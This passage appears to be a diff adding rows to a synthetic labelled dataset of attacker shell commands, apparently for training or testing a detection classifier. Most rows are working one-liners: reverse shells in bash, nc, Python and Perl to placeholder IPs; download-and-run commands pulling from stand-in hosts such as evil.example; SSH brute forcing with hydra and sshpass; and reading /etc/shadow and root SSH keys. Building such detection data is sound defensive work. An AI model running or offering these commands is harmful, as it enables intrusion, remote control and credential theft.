+log-640,2025-03-19T20:37:48.544712Z,"python3 -c 'import urllib.request as u;open(""/tmp/update86.py"",""wb"").write(u.urlopen(""http://payloads.net/update86.py"").read())'; python3 /tmp/update86.py",malware_download
+log-641,2025-01-18T12:23:47.544721Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-642,2025-10-27T10:31:04.544730Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
+log-643,2025-03-19T23:59:18.544740Z,bash -i >& /dev/tcp/45.23.11.9/6666 0>&1,reverse_shell
+log-644,2025-03-25T03:18:53.544749Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 80 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-645,2025-02-09T11:20:28.544759Z,"python3 -c 'import urllib.request as u;open(""/tmp/p54.py"",""wb"").write(u.urlopen(""http://malicious.test/p54.py"").read())'; python3 /tmp/p54.py",malware_download
+log-646,2025-10-13T12:06:47.544768Z,cat /etc/shadow,credential_harvest
+log-647,2025-02-01T10:11:10.544777Z,sshpass -p '123456' ssh admin@1.2.3.4,brute_force
+log-648,2024-12-15T21:03:15.544787Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-649,2025-07-05T11:02:03.544796Z,find / -name '*.conf' -type f,enumeration
+log-650,2025-02-10T19:04:24.544805Z,"python3 -c 'import urllib.request as u;open(""/tmp/install61.py"",""wb"").write(u.urlopen(""http://evil.example/install61.py"").read())'; python3 /tmp/install61.py",malware_download
+log-651,2025-04-01T13:21:19.544815Z,"python3 -c 'import urllib.request as u;open(""/tmp/install64.py"",""wb"").write(u.urlopen(""http://evil.example/install64.py"").read())'; python3 /tmp/install64.py",malware_download
+log-652,2025-02-14T16:24:26.544824Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
+log-653,2025-09-15T17:25:15.544833Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-654,2025-07-09T13:41:39.544842Z,cat /etc/shadow,credential_harvest
+log-655,2025-04-03T23:12:25.544865Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-656,2025-11-13T03:14:49.544883Z,curl -fsSL http://malware.srv/update31.php -o /tmp/update31.php; php /tmp/update31.php,malware_download
+log-657,2025-01-24T19:39:13.544893Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-658,2025-03-18T05:54:20.544903Z,curl -fsSL http://payloads.net/payload35.php -o /tmp/payload35.php; php /tmp/payload35.php,malware_download
+log-659,2025-11-15T09:26:12.544913Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-660,2025-06-18T22:53:27.544922Z,wget http://malicious.test/payload64.sh && chmod +x payload64.sh && ./ payload64.sh,malware_download
+log-661,2025-09-11T00:48:14.544931Z,curl -fsSL http://payloads.net/install44.php -o /tmp/install44.php; php /tmp/install44.php,malware_download
+log-662,2025-05-01T12:51:19.544942Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-663,2025-03-18T01:22:25.544950Z,echo '@reboot root /tmp/x99.sh' >> /etc/crontab,persistence_or_filesystem
+log-664,2025-01-17T08:58:57.544960Z,curl http://payloads.net/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-665,2025-01-28T22:33:36.544969Z,date; whoami,unknown
+log-666,2025-10-25T02:33:40.544978Z,cat /etc/shadow,credential_harvest
+log-667,2025-06-15T04:45:45.544987Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-668,2025-05-30T18:26:59.544997Z,wget http://malware.srv/runme55.sh ; chmod +x runme55.sh ; ./ runme55.sh,malware_download
+log-669,2025-06-16T19:18:40.545005Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-670,2025-05-27T08:59:12.545014Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-671,2025-05-03T12:54:17.545023Z,cat /etc/passwd,credential_harvest
+log-672,2025-05-18T18:18:23.545032Z,wget http://payloads.net/p48.sh && chmod +x p48.sh && ./ p48.sh,malware_download
+log-673,2024-12-07T11:14:32.545041Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-674,2025-10-11T23:30:23.545051Z,wget http://malicious.test/payload48.sh && chmod +x payload48.sh && ./ payload48.sh,malware_download
+log-675,2025-04-03T02:53:18.545060Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""203.0.113.7"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-676,2025-10-05T07:58:19.545069Z,find / -name '*.conf' -type f,enumeration
+log-677,2025-01-30T23:04:18.545078Z,nc -e /bin/sh 192.0.2.12 6666,reverse_shell
+log-678,2024-12-31T05:12:10.545087Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-679,2024-12-10T03:00:14.545097Z,sshpass -p '123456' ssh root@10.0.0.5,brute_force
+log-680,2025-03-14T21:00:41.545106Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-681,2025-02-13T11:43:59.545115Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-682,2025-03-11T16:21:06.545124Z,curl http://payloads.net/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-683,2025-10-22T22:17:31.545134Z,nc -e /bin/sh 1.2.3.4 6666,reverse_shell
+log-684,2025-05-22T00:18:43.545143Z,"perl -e 'use Socket;$i=""1.2.3.4"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-685,2025-03-21T09:32:30.545153Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-686,2025-01-16T19:23:49.545162Z,nc -e /bin/sh 1.2.3.4 9001,reverse_shell
+log-687,2025-02-19T13:05:52.545172Z,mkdir /tmp/persist39; chmod 777 /tmp/persist39,persistence_or_filesystem
+log-688,2025-05-04T07:41:41.545181Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
+log-689,2025-07-31T14:03:58.545191Z,sshpass -p 'toor' ssh admin@203.0.113.7,brute_force
+log-690,2025-10-22T13:30:52.545200Z,some-weird-tool --foo bar,unknown
+log-691,2024-12-09T11:25:27.545209Z,cat /etc/passwd,credential_harvest
+log-692,2025-04-08T03:45:05.545218Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-693,2025-11-21T11:41:55.545228Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-694,2025-05-31T20:52:50.545237Z,cat /etc/shadow,credential_harvest
+log-695,2025-08-15T19:22:41.545246Z,sshpass -p 'password' ssh ubuntu@10.0.0.5,brute_force
+log-696,2025-07-17T07:11:12.545255Z,date; whoami,unknown
+log-697,2025-07-27T07:09:27.545264Z,sshpass -p 'toor' ssh admin@45.23.11.9,brute_force
+log-698,2025-05-02T04:34:13.545273Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-699,2025-06-04T09:04:28.545282Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-700,2025-06-19T00:55:43.545291Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-701,2025-11-04T05:06:55.545299Z,find / -name '*.conf' -type f,enumeration
+log-702,2025-08-06T15:29:56.545308Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-703,2025-11-06T02:41:35.545318Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-704,2025-10-16T01:52:33.545327Z,nc -e /bin/sh 1.2.3.4 443,reverse_shell
+log-705,2025-05-24T11:00:21.545336Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-706,2025-10-16T03:27:35.545345Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-707,2025-01-23T11:43:08.545353Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-708,2025-02-11T08:12:17.545363Z,curl -fsSL http://evil.example/payload84.php -o /tmp/payload84.php; php /tmp/payload84.php,malware_download
+log-709,2025-08-07T09:26:38.545372Z,cat /etc/passwd,credential_harvest
+log-710,2025-09-01T10:35:11.545380Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-711,2025-04-19T02:22:15.545389Z,cat /etc/shadow,credential_harvest
+log-712,2025-05-28T20:25:54.545398Z,sshpass -p 'password' ssh ec2-user@172.16.0.9,brute_force
+log-713,2025-04-25T20:49:45.545407Z,sshpass -p 'toor' ssh ubuntu@1.2.3.4,brute_force
+log-714,2025-09-08T15:32:05.545416Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-715,2025-01-05T23:52:01.545425Z,find / -name '*.conf' -type f,enumeration
+log-716,2025-11-03T23:35:34.545434Z,bash -i >& /dev/tcp/192.0.2.12/8080 0>&1,reverse_shell
+log-717,2025-08-04T02:13:31.545444Z,curl -fsSL http://malicious.test/update77.php -o /tmp/update77.php; php /tmp/update77.php,malware_download
+log-718,2025-03-21T06:38:29.545454Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-719,2025-03-16T11:00:13.545463Z,find / -name '*.conf' -type f,enumeration
+log-720,2025-02-11T04:15:03.545472Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
+log-721,2025-02-17T22:11:00.545482Z,curl -fsSL http://malicious.test/x40.php -o /tmp/x40.php; php /tmp/x40.php,malware_download
+log-722,2025-02-12T02:24:33.545491Z,echo '@reboot root /tmp/update57.sh' >> /etc/crontab,persistence_or_filesystem
+log-723,2025-07-20T13:59:07.545500Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
+log-724,2025-08-13T00:19:27.545510Z,"python3 -c 'import urllib.request as u;open(""/tmp/p38.py"",""wb"").write(u.urlopen(""http://malicious.test/p38.py"").read())'; python3 /tmp/p38.py",malware_download
+log-725,2024-12-22T17:54:51.545519Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-726,2025-01-06T03:28:27.545529Z,curl -fsSL http://malware.srv/update52.php -o /tmp/update52.php; php /tmp/update52.php,malware_download
+log-727,2025-04-14T15:30:15.545538Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
+log-728,2025-09-26T06:52:50.545547Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-729,2025-05-14T08:20:01.545556Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-730,2025-08-24T13:41:04.545565Z,nc -e /bin/sh 1.2.3.4 8080,reverse_shell
+log-731,2025-10-14T07:46:35.545575Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme39.py"",""wb"").write(u.urlopen(""http://malicious.test/runme39.py"").read())'; python3 /tmp/runme39.py",malware_download
+log-732,2025-01-03T08:48:52.545585Z,"python3 -c 'import urllib.request as u;open(""/tmp/update27.py"",""wb"").write(u.urlopen(""http://evil.example/update27.py"").read())'; python3 /tmp/update27.py",malware_download
+log-733,2025-05-06T10:29:40.545595Z,wget http://badhost.local/install51.sh ; chmod +x install51.sh ; ./ install51.sh,malware_download
+log-734,2025-01-31T06:58:07.545604Z,cat /etc/shadow,credential_harvest
+log-735,2025-11-04T13:22:17.545613Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-736,2025-10-21T17:25:28.545621Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-737,2025-09-06T05:24:58.545630Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-738,2025-07-19T05:02:21.545639Z,cat /etc/shadow,credential_harvest
+log-739,2025-10-29T00:04:34.545648Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
+log-740,2025-10-30T04:38:48.545657Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 8080 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-741,2025-10-09T22:56:17.545666Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-742,2025-07-17T22:01:55.545675Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-743,2025-12-01T17:57:30.545685Z,wget http://malware.srv/payload95.sh ; chmod +x payload95.sh ; ./ payload95.sh,malware_download
+log-744,2025-01-13T00:09:52.545694Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
+log-745,2025-05-29T19:13:20.545704Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-746,2025-10-18T21:47:41.545713Z,wget http://payloads.net/runme86.sh && chmod +x runme86.sh && ./ runme86.sh,malware_download
+log-747,2025-08-22T08:11:03.545723Z,cat /etc/passwd,credential_harvest
+log-748,2025-01-06T16:23:35.545732Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-749,2025-07-05T06:06:11.545742Z,curl -fsSL http://payloads.net/p9.php -o /tmp/p9.php; php /tmp/p9.php,malware_download
+log-750,2024-12-16T23:04:02.545753Z,sshpass -p 'toor' ssh ubuntu@203.0.113.7,brute_force
+log-751,2025-02-10T03:25:23.545763Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-752,2025-05-29T09:44:56.545772Z,nc -e /bin/sh 45.23.11.9 80,reverse_shell
+log-753,2025-06-21T23:01:07.545782Z,bash -i >& /dev/tcp/45.23.11.9/80 0>&1,reverse_shell
+log-754,2025-08-04T20:24:49.545791Z,nc -e /bin/sh 192.0.2.12 80,reverse_shell
+log-755,2025-01-19T03:41:13.545800Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
+log-756,2025-02-28T20:27:58.545810Z,"python3 -c 'import urllib.request as u;open(""/tmp/x12.py"",""wb"").write(u.urlopen(""http://evil.example/x12.py"").read())'; python3 /tmp/x12.py",malware_download
+log-757,2025-09-07T05:50:55.545819Z,nc -e /bin/sh 172.16.0.9 2222,reverse_shell
+log-758,2025-05-27T21:47:56.545828Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-759,2025-10-25T16:58:34.545837Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 80 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-760,2025-05-28T07:26:24.545846Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-761,2025-03-25T14:16:51.545854Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-762,2025-11-17T23:22:30.545866Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-763,2025-11-07T04:12:30.545876Z,bash -i >& /dev/tcp/192.0.2.12/9001 0>&1,reverse_shell
+log-764,2024-12-31T04:24:40.545886Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-765,2024-12-07T13:54:48.545895Z,"python3 -c 'import urllib.request as u;open(""/tmp/p99.py"",""wb"").write(u.urlopen(""http://malicious.test/p99.py"").read())'; python3 /tmp/p99.py",malware_download
+log-766,2025-03-09T03:55:56.545913Z,nc -e /bin/sh 45.23.11.9 2222,reverse_shell
+log-767,2025-07-22T20:16:43.545922Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-768,2025-05-07T04:04:36.545931Z,echo '@reboot root /tmp/p9.sh' >> /etc/crontab,persistence_or_filesystem
+log-769,2025-10-11T11:29:56.545941Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-770,2025-01-21T23:55:53.545950Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-771,2025-02-10T19:21:32.545958Z,find / -name '*.conf' -type f,enumeration
+log-772,2025-08-20T08:53:22.545967Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
+log-773,2025-05-01T15:39:13.545976Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-774,2025-10-17T03:47:41.545985Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-775,2025-08-01T14:29:35.545995Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
+log-776,2025-06-06T02:14:28.546004Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-777,2025-05-01T10:34:19.546012Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-778,2025-03-28T00:44:10.546021Z,some-weird-tool --foo bar,unknown
+log-779,2025-01-04T00:39:03.546031Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-780,2025-09-28T08:26:42.546042Z,wget http://malicious.test/runme33.sh ; chmod +x runme33.sh ; ./ runme33.sh,malware_download
+log-781,2025-05-25T04:05:55.546051Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-782,2025-06-15T06:20:45.546061Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-783,2025-11-05T06:25:25.546069Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-784,2025-05-19T03:34:21.546079Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-785,2025-02-02T17:35:21.546089Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-786,2025-03-28T17:17:39.546098Z,wget http://malware.srv/runme74.sh && chmod +x runme74.sh && ./ runme74.sh,malware_download
+log-787,2025-04-01T13:38:30.546108Z,cat /etc/shadow,credential_harvest
+log-788,2025-05-20T13:40:08.546117Z,bash -i >& /dev/tcp/203.0.113.7/2222 0>&1,reverse_shell
+log-789,2025-01-05T21:56:50.546126Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
+log-790,2025-02-16T00:11:43.546135Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-791,2025-11-10T23:38:05.546144Z,cat /etc/passwd,credential_harvest
+log-792,2025-05-17T10:07:00.546153Z,some-weird-tool --foo bar,unknown
+log-793,2025-01-06T11:42:03.546162Z,bash -i >& /dev/tcp/172.16.0.9/443 0>&1,reverse_shell
+log-794,2024-12-17T00:27:52.546171Z,nc -e /bin/sh 1.2.3.4 4444,reverse_shell
+log-795,2025-11-04T08:20:13.546180Z,find / -name '*.conf' -type f,enumeration
+log-796,2025-01-03T23:38:07.546190Z,wget http://payloads.net/payload75.sh && chmod +x payload75.sh && ./ payload75.sh,malware_download
+log-797,2025-09-16T00:42:35.546199Z,curl -fsSL http://evil.example/p17.php -o /tmp/p17.php; php /tmp/p17.php,malware_download
+log-798,2025-12-06T18:51:55.546208Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-799,2025-10-18T02:16:42.546217Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-800,2025-06-06T17:48:27.546226Z,bash -i >& /dev/tcp/10.0.0.5/443 0>&1,reverse_shell
+log-801,2025-10-25T18:39:10.546240Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme21.py"",""wb"").write(u.urlopen(""http://evil.example/runme21.py"").read())'; python3 /tmp/runme21.py",malware_download
+log-802,2025-05-30T07:23:08.546248Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-803,2025-08-03T01:05:04.546257Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-804,2025-08-13T17:56:38.546266Z,nc -e /bin/sh 192.0.2.12 4444,reverse_shell
+log-805,2025-04-01T00:25:43.546276Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload94.py"",""wb"").write(u.urlopen(""http://malicious.test/payload94.py"").read())'; python3 /tmp/payload94.py",malware_download
+log-806,2025-05-21T21:19:44.546285Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-807,2025-10-03T22:42:45.546294Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-808,2025-04-16T21:14:26.546304Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-809,2025-01-16T00:44:30.546313Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-810,2025-02-16T01:49:00.546323Z,echo '@reboot root /tmp/runme31.sh' >> /etc/crontab,persistence_or_filesystem
+log-811,2024-12-21T08:31:22.546332Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
+log-812,2025-01-02T08:40:45.546341Z,cat /etc/shadow,credential_harvest
+log-813,2025-06-10T02:03:13.546350Z,cat /etc/passwd,credential_harvest
+log-814,2025-07-06T10:19:01.546360Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 4444 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-815,2025-01-24T10:07:47.546370Z,bash -i >& /dev/tcp/172.16.0.9/80 0>&1,reverse_shell
+log-816,2025-06-09T03:35:04.546380Z,wget http://malware.srv/p1.sh ; chmod +x p1.sh ; ./ p1.sh,malware_download
+log-817,2025-01-04T18:48:00.546390Z,"python3 -c 'import urllib.request as u;open(""/tmp/p63.py"",""wb"").write(u.urlopen(""http://malicious.test/p63.py"").read())'; python3 /tmp/p63.py",malware_download
+log-818,2025-01-04T11:54:38.546400Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-819,2025-06-21T02:45:23.546409Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
+log-820,2024-12-06T23:16:02.546418Z,curl -fsSL http://payloads.net/install71.php -o /tmp/install71.php; php /tmp/install71.php,malware_download
+log-821,2025-09-18T15:22:41.546428Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-822,2025-04-05T17:22:05.546437Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
+log-823,2024-12-13T18:54:04.546446Z,nc -e /bin/sh 45.23.11.9 6666,reverse_shell
+log-824,2025-10-06T23:05:25.546455Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-825,2025-03-13T16:44:59.546464Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-826,2025-10-11T18:06:15.546473Z,cat /etc/passwd,credential_harvest
+log-827,2025-06-25T20:11:21.546482Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-828,2025-10-11T00:22:46.546492Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-829,2025-01-08T17:51:37.546500Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-830,2024-12-11T11:40:38.546510Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload84.py"",""wb"").write(u.urlopen(""http://evil.example/payload84.py"").read())'; python3 /tmp/payload84.py",malware_download
+log-831,2025-10-02T20:55:38.546520Z,mkdir /tmp/persist6; chmod 777 /tmp/persist6,persistence_or_filesystem
+log-832,2025-11-02T10:19:41.546529Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-833,2025-08-31T13:26:05.546538Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
+log-834,2025-07-20T20:22:23.546547Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
+log-835,2025-08-16T17:07:01.546556Z,curl -fsSL http://malware.srv/payload91.php -o /tmp/payload91.php; php /tmp/payload91.php,malware_download
+log-836,2025-09-29T18:03:39.546565Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-837,2025-10-25T07:54:31.546574Z,find / -name '*.conf' -type f,enumeration
+log-838,2025-07-16T21:28:20.546583Z,bash -i >& /dev/tcp/203.0.113.7/9001 0>&1,reverse_shell
+log-839,2025-08-16T16:06:04.546593Z,nc -e /bin/sh 172.16.0.9 443,reverse_shell
+log-840,2025-09-05T11:10:52.546603Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-841,2025-05-19T05:46:37.546613Z,curl -fsSL http://malicious.test/p40.php -o /tmp/p40.php; php /tmp/p40.php,malware_download
+log-842,2025-11-30T05:56:31.546622Z,curl -fsSL http://evil.example/p93.php -o /tmp/p93.php; php /tmp/p93.php,malware_download
